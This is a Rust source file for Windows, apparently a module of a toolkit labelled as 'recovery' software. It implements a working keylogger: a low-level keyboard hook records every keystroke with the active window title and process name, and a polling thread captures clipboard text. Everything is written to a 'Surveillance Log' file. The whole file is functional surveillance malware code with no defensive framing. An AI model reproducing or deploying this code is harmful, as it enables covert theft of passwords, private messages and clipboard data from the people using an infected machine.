use crate::recovery::context::RecoveryContext;
use crate::recovery::settings::RecoveryControl;
use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
use async_trait::async_trait;
use once_cell::sync::Lazy;
use std::sync::{Arc, Mutex};
use std::time::{Duration, SystemTime};
use tokio::time::interval;
use tracing::error;
use windows::Win32::Foundation::{HGLOBAL, HMODULE, HWND, LPARAM, LRESULT, WPARAM};
use windows::Win32::System::DataExchange::{
    CloseClipboard, GetClipboardData, OpenClipboard,
};
use windows::Win32::System::Memory::{GlobalLock, GlobalUnlock};
use windows::Win32::System::ProcessStatus::GetModuleBaseNameW;
use windows::Win32::System::Threading::{
    OpenProcess,
    PROCESS_QUERY_INFORMATION,
    PROCESS_VM_READ,
};
use windows::Win32::UI::Input::KeyboardAndMouse::*;
use windows::Win32::UI::WindowsAndMessaging::*;

static KEY_LOG_BUFFER: Lazy<Arc<Mutex<String>>> = Lazy::new(|| Arc::new(Mutex::new(String::new())));
static LAST_WINDOW_TITLE: Lazy<Arc<Mutex<String>>> = Lazy::new(|| Arc::new(Mutex::new(String::new())));

// We keep track of the last clipboard content hash or string to avoid duplicates.
static LAST_CLIPBOARD: Lazy<Arc<Mutex<String>>> = Lazy::new(|| Arc::new(Mutex::new(String::new())));

const CF_UNICODETEXT: u32 = 13;

pub struct KeyloggerTask;

#[async_trait]
impl RecoveryTask for KeyloggerTask {
    fn label(&self) -> String {
        "Keylogger & Clipboard".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::System
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let log_file_path = ctx.output_dir.join("keylog.txt");
        let buffer = KEY_LOG_BUFFER.clone();
        
        // 1. Spawn Keylogger Thread (Message Loop)
        std::thread::spawn(move || {
            install_hook();
        });

        // 2. Spawn Clipboard Monitor (Polling)
        if RecoveryControl::global().capture_clipboard() {
            let clip_buffer = buffer.clone();
            std::thread::spawn(move || {
                run_clipboard_monitor(clip_buffer);
            });
        }

        // 3. Spawn File Flusher (Async)
        let flush_path = log_file_path.clone();
        let flush_buffer = buffer.clone();
        
        tokio::spawn(async move {
            let mut interval = interval(Duration::from_secs(5));
            loop {
                interval.tick().await;
                let mut content = String::new();
                {
                    let mut lock = flush_buffer.lock().unwrap();
                    if !lock.is_empty() {
                        content = lock.clone();
                        lock.clear();
                    }
                }

                if !content.is_empty() {
                    use tokio::io::AsyncWriteExt;
                    // Use OpenOptions to append
                    let file = tokio::fs::OpenOptions::new()
                        .create(true)
                        .append(true)
                        .open(&flush_path)
                        .await;
                    
                    if let Ok(mut f) = file {
                        let _ = f.write_all(content.as_bytes()).await;
                    }
                }
            }
        });
        
        Ok(vec![RecoveryArtifact {
            label: "Surveillance Log".to_string(),
            path: log_file_path,
            size_bytes: 0, // Dynamic
            modified: Some(SystemTime::now()),
        }])
    }
}

// --- Keylogger Logic ---

fn install_hook() {
    unsafe {
        let hook_result = SetWindowsHookExW(
            WH_KEYBOARD_LL,
            Some(hook_callback),
            HMODULE::default(),
            0,
        );

        let hook_id = match hook_result {
            Ok(h) => h,
            Err(e) => {
                error!("failed to install keyboard hook: {}", e);
                return;
            }
        };

        if hook_id.is_invalid() {
            error!("failed to install keyboard hook (invalid handle)");
            return;
        }

        let mut msg = MSG::default();
        // Standard message pump
        while GetMessageW(&mut msg, HWND::default(), 0, 0).as_bool() {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
        
        let _ = UnhookWindowsHookEx(hook_id);
    }
}

unsafe extern "system" fn hook_callback(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
    if code >= 0 && wparam.0 == WM_KEYDOWN as usize {
        let kbd_struct = unsafe { *(lparam.0 as *const KBDLLHOOKSTRUCT) };
        let vk_code = kbd_struct.vkCode;
        
        // Improve Context: Title + Process + Time
        let (window_title, process_name) = get_foreground_info();
        let context_str = format!("{} ({})", window_title, process_name);
        
        let mut last_title = LAST_WINDOW_TITLE.lock().unwrap();
        let mut log_entry = String::new();
        
        if *last_title != context_str {
            let time = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
            log_entry.push_str(&format!("\n\n/// [{}] - {} ///\n", time, context_str));
            *last_title = context_str;
        }

        // Better mapping
        let key_str = map_key(vk_code);
        log_entry.push_str(&key_str);

        let mut buffer = KEY_LOG_BUFFER.lock().unwrap();
        buffer.push_str(&log_entry);
    }

    unsafe { CallNextHookEx(HHOOK::default(), code, wparam, lparam) }
}

fn get_foreground_info() -> (String, String) {
    unsafe {
        let hwnd = GetForegroundWindow();
        if hwnd.0 == 0 {
            return ("Unknown".to_string(), "Unknown".to_string());
        }
        
        // 1. Window Title
        let len = GetWindowTextLengthW(hwnd);
        let title = if len > 0 {
            let mut buf = vec![0u16; (len + 1) as usize];
            GetWindowTextW(hwnd, &mut buf);
            String::from_utf16_lossy(&buf[..len as usize])
        } else {
            "No Title".to_string()
        };

        // 2. Process Name
        let mut process_id = 0;
        GetWindowThreadProcessId(hwnd, Some(&mut process_id));
        
        let process_name = if process_id != 0 {
            let process_handle = OpenProcess(
                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 
                false,
                process_id
            );
            
            if let Ok(h_proc) = process_handle {
                let mut mod_buf = [0u16; 260];
                let success = GetModuleBaseNameW(h_proc, HMODULE::default(), &mut mod_buf);
                let _ = windows::Win32::Foundation::CloseHandle(h_proc); // Always close
                
                if success > 0 {
                    let end = mod_buf.iter().position(|&c| c == 0).unwrap_or(mod_buf.len());
                    String::from_utf16_lossy(&mod_buf[..end])
                } else {
                    "Unknown Process".to_string()
                }
            } else {
                "System/Protected".to_string()
            }
        } else {
            "Unknown PID".to_string()
        };

        (title, process_name)
    }
}

fn map_key(vk: u32) -> String {
    // Handle special keys first to avoid VSC mapping issues
    match vk {
        0x08 => return "[BACKSPACE]".to_string(),
        0x0D => return "\n".to_string(),
        0x20 => return " ".to_string(),
        0x09 => return "[TAB]".to_string(),
        0x1B => return "[ESC]".to_string(),
        // Modifiers - ignore them as standalone prints to avoid clutter, 
        // we use them in state for other keys.
        0x10 | 0xA0 | 0xA1 | 0x11 | 0xA2 | 0xA3 | 0x12 | 0xA4 | 0xA5 => return "".to_string(),
        0x2E => return "[DEL]".to_string(),
        _ => {}
    }

    unsafe {
        // Manually build state for ToUnicode
        let mut state = [0u8; 256];
        
        // Check physical state of modifiers
        if (GetKeyState(VK_SHIFT.0 as i32) as u16 & 0x8000) != 0 {
            state[VK_SHIFT.0 as usize] = 0x80;
        }
        if (GetKeyState(VK_CAPITAL.0 as i32) as u16 & 0x0001) != 0 {
            state[VK_CAPITAL.0 as usize] = 0x01;
        }
        if (GetKeyState(VK_CONTROL.0 as i32) as u16 & 0x8000) != 0 {
            state[VK_CONTROL.0 as usize] = 0x80;
        }
        if (GetKeyState(VK_MENU.0 as i32) as u16 & 0x8000) != 0 {
            state[VK_MENU.0 as usize] = 0x80;
        }

        let mut buf = [0u16; 16];
        let scan_code = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
        
        // ToUnicode translates virtual-key code + scan code + state -> unicode char
        let result = ToUnicode(vk, scan_code, Some(&state), &mut buf, 0);
        
        if result > 0 {
            // Check for control characters
            let s = String::from_utf16_lossy(&buf[..result as usize]);
            // If it's a control char (like Ctrl+C), format it nicely
            if (state[VK_CONTROL.0 as usize] & 0x80) != 0 {
                // It's a control combo
                 return format!("[CTRL+{}]", s.to_uppercase());
            }
            s
        } else {
             // Fallback for function keys etc
             // We could map F1-F12 specifically if needed
             if vk >= 0x70 && vk <= 0x7B {
                 format!("[F{}]", vk - 0x6F)
             } else {
                 String::new() // Ignore unknown junk
             }
        }
    }
}

// --- Clipboard Logic ---

fn run_clipboard_monitor(buffer: Arc<Mutex<String>>) {
    // Simple polling loop. 
    // In a "top tier" real-world scenario, we'd create a hidden window and use AddClipboardFormatListener
    // to receive WM_CLIPBOARDUPDATE, but polling is robust enough for a task thread.
    loop {
        std::thread::sleep(Duration::from_secs(2));
        
        if let Some(text) = get_clipboard_text() {
            let mut last = LAST_CLIPBOARD.lock().unwrap();
            if *last != text && !text.trim().is_empty() {
                let time = chrono::Local::now().format("%H:%M:%S");
                let log = format!("\n\n/// [CLIPBOARD] - {} ///\n{}\n\n", time, text);
                
                let mut buf = buffer.lock().unwrap();
                buf.push_str(&log);
                
                *last = text;
            }
        }
    }
}

fn get_clipboard_text() -> Option<String> {
    unsafe {
        // OpenClipboard returns Result<()>
        if OpenClipboard(HWND::default()).is_ok() {
            // GetClipboardData returns Result<HANDLE>
            let h_data_result = GetClipboardData(CF_UNICODETEXT);
            
            match h_data_result {
                Ok(h_data) if !h_data.is_invalid() => {
                    // GlobalLock returns *mut c_void
                    let h_global = HGLOBAL(h_data.0 as *mut std::ffi::c_void);
                    let ptr = GlobalLock(h_global);
                    if !ptr.is_null() {
                        let len = (0..).take_while(|&i| *ptr.cast::<u16>().add(i) != 0).count();
                        let slice = std::slice::from_raw_parts(ptr.cast::<u16>(), len);
                        let text = String::from_utf16_lossy(slice);
                        
                        // GlobalUnlock returns Result<BOOL> or similar, we just ignore
                        let _ = GlobalUnlock(h_global);
                        let _ = CloseClipboard();
                        return Some(text);
                    }
                },
                _ => {}
            }
            let _ = CloseClipboard();
        }
    }
    None
}